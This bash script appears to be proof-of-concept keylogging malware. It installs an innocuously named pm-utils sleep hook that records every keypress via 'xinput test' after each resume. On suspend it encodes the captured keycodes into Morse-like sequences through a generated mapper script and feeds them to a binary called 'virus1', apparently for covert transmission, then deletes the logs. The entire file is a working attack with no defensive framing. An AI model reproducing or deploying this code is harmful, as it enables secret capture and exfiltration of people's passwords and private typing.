#!/bin/bash

xinput --list | grep "AT Translated Set 2 keyboard" > id.log
id=$(cat id.log | egrep -o '[4-9]')
echo $id

printf "#!/bin/bash\ncase \"\$1\" in\nsuspend|hibernate)\nfilekey=\$(echo keyspressed.log)\ntouch morsecode.raw\n./keymapper.sh \$filekey morsecode.raw\n./virus1 105000000  1024     768      1400   10000000  morsecode.raw\nrm morsecode.raw\nrm keyspressed.log\n;;\nresume|thaw)\n(sleep 1;stdbuf -oL xinput test 8 > keyspressed.log)&\n;;\nesac" > /usr/lib/pm-utils/sleep.d/99-tester.sh

chmod +x /usr/lib/pm-utils/sleep.d/99-tester.sh

printf "#!/bin/bash\nfile=\$1\nfile2=\$2\nwhile read -r line\ndo\n	name=\"\$line\"\n	varnum=\$(echo \$name | egrep -o [0-9]+[0-9])\n	case \$varnum in\n	38)\n		printf \"h8gpp\\\nh8gggpppppp\\\n\" >> \$file2\n	;;\n	56)\n		printf \"h8gggpp\\\nh8gpp\\\nh8gpp\\\nh8gpppppp\\\n\" >> \$file2\n	;;\n	54)\n		printf \"h8gggpp\\\nh8gpp\\\nh8gggpp\\\nh8gpppppp\\\n\" >> \$file2\n	;;\n	40)\n		printf \"h8gggpp\\\nh8gpp\\\nh8gpppppp\\\n\" >> \$file2\n	;;\n	26)\n		printf \"h8gpppppp\\\n\" >> \$file2\n	;;\n	41)\n		printf \"h8gpp\\\nh8gpp\\\nh8gggpp\\\nh8gpppppp\\\n\" >> \$file2\n	;;\n	42)	\n		printf \"h8gggpp\\\nh8gggpp\\\nh8gpppppp\\\n\" >> \$file2\n	;;\n	43)\n		printf \"h8gpp\\\nh8gpp\\\nh8gpp\\\nh8gpppppp\\\n\" >> \$file2\n	;;\n	31)\n		printf \"h8gpp\\\nh8gpppppp\\\n\" >> \$file2\n	;;\n	44)\n		printf \"h8gpp\\\nh8gggpp\\\nh8gggpp\\\nh8gggpppppp\\\n\" >> \$file2\n	;;\n	45)\n		printf \"h8gggpp\\\nh8gpp\\\nh8gggpppppp\\\n\" >> \$file2\n	;;\n	46)\n		printf \"h8gpp\\\nh8gggpp\\\nh8gpp\\\nh8gppppppp\\\n\" >> \$file2\n	;;\n	58)\n		printf \"h8gggpp\\\nh8gggpppppp\\\n\" >> \$file2\n	;;\n	57)\n		printf \"h8gggpp\\\nh8gpppppp\\\n\" >> \$file2\n	;;\n	32)\n		printf \"h8gggpp\\\nh8gggpp\\\nh8gggpppppp\\\n\" >> \$file2\n	;;\n	33)\n		printf \"h8gpp\\\nh8gggpp\\\nh8gggpp\\\nh8gpppppp\\\n\" >> \$file2\n	;;\n	24)\n		printf \"h8gggpp\\\nh8gggpp\\\nh8gpp\\\nh8gggpppppp\\\n\" >> \$file2\n	;;\n	27)\n		printf \"h8gpp\\\nh8gggpp\\\nh8gpppppp\\\n\" >> \$file2\n	;;\n	39)\n		printf \"h8gpp\\\nh8gpp\\\nh8gpppppp\\\n\" >> \$file2\n	;;\n	28)\n		printf \"h8gggpppppp\\\n\" >> \$file2\n	;;\n	30)\n		printf \"h8gpp\\\nh8gpp\\\nh8gggpppppp\\\n\" >> \$file2\n	;;\n	55)\n		printf \"h8gpp\\\nh8gpp\\\nh8gpp\\\nh8gggpppppp\\\n\" >> \$file2\n	;;\n	53)\n		printf \"h8gggpp\\\nh8gpp\\\nh8gpp\\\nh8gggpppppp\\\n\" >> \$file2\n	;;\n	29)\n		printf \"h8gggpp\\\nh8gpp\\\nh8gggpp\\\nh8gggpppppp\\\n\" >> \$file2\n	;;\n	52)\n		printf \"h8gggpp\\\nh8gggpp\\\nh8gpp\\\nh8gpppppp\\\n\" >> \$file2\n	;;\n	19)\n		printf \"h8gggpp\\\nh8gggpp\\\nh8gggpp\\\nh8gggpp\\\nh8gggpppppp\\\n\" >> \$file2\n	;;\n	18)\n		printf \"h8gggpp\\\nh8gggpp\\\nh8gggpp\\\nh8gggpp\\\nh8gpppppp\\\n\" >> \$file2\n	;;\n	17)\n		printf \"h8gggpp\\\nh8gggpp\\\nh8gggpp\\\nh8gpp\\\nh8gpppppp\\\n\" >> \$file2\n	;;\n	16)\n		printf \"h8gggpp\\\nh8gggpp\\\nh8gpp\\\nh8gpp\\\nh8gpppppp\\\n\" >> \$file2\n	;;\n	15)\n		printf \"h8gggpp\\\nh8gpp\\\nh8gpp\\\nh8gpp\\\nh8gpppppp\\\n\" >> \$file2\n	;;\n	14)\n		printf \"h8gpp\\\nh8gpp\\\nh8gpp\\\nh8gpp\\\nh8gpppppp\\\n\" >> \$file2\n	;;\n	13)\n		printf \"h8gpp\\\nh8gpp\\\nh8gpp\\\nh8gpp\\\nh8gggpppppp\\\n\" >> \$file2\n	;;\n	12)\n		printf \"h8gpp\\\nh8gpp\\\nh8gpp\\\nh8gggpp\\\nh8gggpppppp\\\n\" >> \$file2\n	;;\n	11)\n		printf \"h8gpp\\\nh8gpp\\\nh8gggpp\\\nh8gggpp\\\nh8gggpppppp\\\n\" >> \$file2\n	;;\n	10) \n		printf \"h8gpp\\\nh8gggpp\\\nh8gggpp\\\nh8gggpp\\\nh8gggpppppp\\\n\" >> \$file2\n	;;\n	25)\n		printf \"h8gpp\\\nh8gggpp\\\nh8gggpppppp\\\n\" >> \$file2\n	;;\n	esac\ndone < \"\$file\"" > /usr/lib/pm-utils/sleep.d/keymapper.sh

chmod +x /usr/lib/pm-utils/sleep.d/keymapper.sh




